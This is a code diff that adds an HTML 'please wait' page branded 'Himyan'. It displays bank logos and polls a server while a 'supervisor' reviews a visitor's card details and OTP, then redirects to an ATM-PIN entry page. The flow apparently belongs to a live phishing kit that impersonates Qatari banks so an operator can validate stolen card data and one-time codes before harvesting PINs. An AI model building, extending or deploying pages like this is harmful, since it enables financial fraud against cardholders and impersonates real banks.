@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Himyan</title>
+  <style>
+    :root {
+      color-scheme: light;
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      min-height: 100%;
+      margin: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      overflow: hidden;
+      background: #fff;
+      font-family: Arial, sans-serif;
+    }
+
+    .loading-screen {
+      position: fixed;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      background: #fff;
+    }
+
+    .loading-mark {
+      position: relative;
+      display: grid;
+      place-items: center;
+      width: min(76vw, 300px);
+      aspect-ratio: 1;
+    }
+
+    .loading-mark::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border: 4px solid #eee7e9;
+      border-top-color: #86183c;
+      border-right-color: #86183c;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .loading-logos {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: clamp(14px, 5vw, 26px);
+      width: 78%;
+      min-height: 86px;
+      padding: 14px;
+      background: #fff;
+    }
+
+    .loading-logo {
+      display: block;
+      width: clamp(78px, 22vw, 122px);
+      height: clamp(54px, 16vw, 88px);
+      object-fit: contain;
+    }
+
+    .loading-logo.bank-logo {
+      width: clamp(58px, 18vw, 100px);
+    }
+
+    .waiting-message {
+      position: absolute;
+      bottom: -120px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      color: #86183c;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 1.6;
+      padding: 20px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(134, 24, 60, 0.1);
+    }
+
+    .waiting-message p {
+      margin: 0 0 12px 0;
+    }
+
+    .waiting-message p:last-child {
+      margin: 0;
+      font-size: 15px;
+      color: #666;
+      font-weight: normal;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .loading-mark::before {
+        animation-duration: 2.5s;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="loading-screen" aria-label="Loading">
+    <div class="loading-mark" aria-hidden="true">
+      <div class="loading-logos">
+        <img class="loading-logo" src="assets/logo.svg" alt="" />
+        <img class="loading-logo bank-logo" id="selected-bank-logo" src="assets/bank-logos/bank-logo-default.svg"
+          alt="" />
+      </div>
+      <div class="waiting-message" id="waiting-message">
+        <p>يُرجى الانتظار...</p>
+        <p>جارٍ مراجعة طلبك من قبل المشرف. سيتم إرسال رمز التأكيد (OTP) إلى جوالك فور الموافقة.</p>
+      </div>
+    </div>
+  </main>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const requestId = params.get('requestId') || localStorage.getItem('himyan-request-id') || '';
+    const stage = params.get('stage') === 'code' ? 'code' : 'card';
+    const lang = params.get('lang') === 'en' ? 'en' : 'ar';
+    const selectedBank = (() => {
+      try { return JSON.parse(localStorage.getItem('himyan-selected-bank') || '{}'); } catch { return {}; }
+    })();
+    const bankCode = params.get('bank') || selectedBank.code || '';
+    const waitingMessage = document.querySelector('#waiting-message');
+
+    // Update message based on stage
+    if (stage === 'code') {
+      waitingMessage.innerHTML = lang === 'ar'
+        ? '<p>يُرجى الانتظار...</p><p>جارٍ مراجعة رمز التأكيد (OTP) من قبل المشرف.</p>'
+        : '<p>Please wait...</p><p>Your confirmation code (OTP) is being reviewed by the supervisor.</p>';
+    } else {
+      waitingMessage.innerHTML = lang === 'ar'
+        ? '<p>يُرجى الانتظار...</p><p>جارٍ مراجعة طلبك من قبل المشرف. سيتم إرسال رمز التأكيد (OTP) إلى جوالك فور الموافقة.</p>'
+        : '<p>Please wait...</p><p>Your request is being reviewed by the supervisor. A confirmation code (OTP) will be sent to your mobile upon approval.</p>';
+    }
+    const bankLogoFiles = {
+      qnb: 'assets/official-bank-logos/official-bank-logo-qnb.png',
+      cbq: 'assets/official-bank-logos/official-bank-logo-cbq.png',
+      doha: 'assets/official-bank-logos/official-bank-logo-doha.png',
+      ahli: 'assets/official-bank-logos/official-bank-logo-ahli.png',
+      qib: 'assets/official-bank-logos/official-bank-logo-qib.png',
+      rayan: 'assets/official-bank-logos/official-bank-logo-rayan.png',
+      qiib: 'assets/official-bank-logos/official-bank-logo-qiib.png',
+      dukhan: 'assets/official-bank-logos/official-bank-logo-dukhan.png',
+      lesha: 'assets/official-bank-logos/official-bank-logo-lesha.png',
+      qdb: 'assets/official-bank-logos/official-bank-logo-qdb.png',
+      hsbc: 'assets/official-bank-logos/official-bank-logo-hsbc.png',
+      scb: 'assets/official-bank-logos/official-bank-logo-scb.png',
+      arab: 'assets/official-bank-logos/official-bank-logo-arab.png',
+      mashreq: 'assets/official-bank-logos/official-bank-logo-mashreq.png',
+      citibank: 'assets/official-bank-logos/official-bank-logo-citibank.png',
+      bnpp: 'assets/official-bank-logos/official-bank-logo-bnpp.png',
+      saderat: 'assets/official-bank-logos/official-bank-logo-saderat.png'
+    };
+    const bankLogo = document.querySelector('#selected-bank-logo');
+    bankLogo.src = bankLogoFiles[bankCode] || 'assets/bank-logos/bank-logo-default.svg';
+    bankLogo.onerror = () => { bankLogo.src = 'assets/bank-logos/bank-logo-default.svg'; };
+    let timer;
+
+    function handleDecision(status) {
+
+      if (stage === 'card') {
+        if (status === 'approved') {
+          clearInterval(timer);
+          window.location.href = `confirmation-code.html?lang=${lang}&requestId=${encodeURIComponent(requestId)}`;
+        } else if (status === 'rejected') {
+          clearInterval(timer);
+          localStorage.setItem('himyan-card-error', lang === 'ar' ? 'معلومات البطاقة غير صحيحة، يرجى التأكد من المعلومات الصحيحة وإعادة المحاولة' : 'Card information is incorrect. Please verify the correct information and try again.');
+          window.location.href = `confirmation.html?lang=${lang}&requestId=${encodeURIComponent(requestId)}`;
+        }
+      } else if (stage === 'code') {
+        if (status === 'code_approved') {
+          clearInterval(timer);
+          window.location.href = `atm-pin.html?lang=${lang}&requestId=${encodeURIComponent(requestId)}`;
+        } else if (status === 'code_rejected') {
+          clearInterval(timer);
+          localStorage.setItem('himyan-otp-error', lang === 'ar' ? 'الرمز الذي تم إدخاله غير صحيح وغير صالح' : 'The code entered is incorrect and invalid');
+          window.location.href = `confirmation-code.html?lang=${lang}&requestId=${encodeURIComponent(requestId)}`;
+        }
+      }
+    }
+
+    async function poll() {
+      if (!requestId) return;
+      try {
+        const response = await fetch(`/api/requests/status?id=${encodeURIComponent(requestId)}`, { cache: 'no-store' });
+        const data = await response.json();
+        if (response.ok && data.ok) handleDecision(data.status);
+      } catch { }
+    }
+    poll();
+    timer = setInterval(poll, 3000);
+  </script>
+</body>
+
+</html>
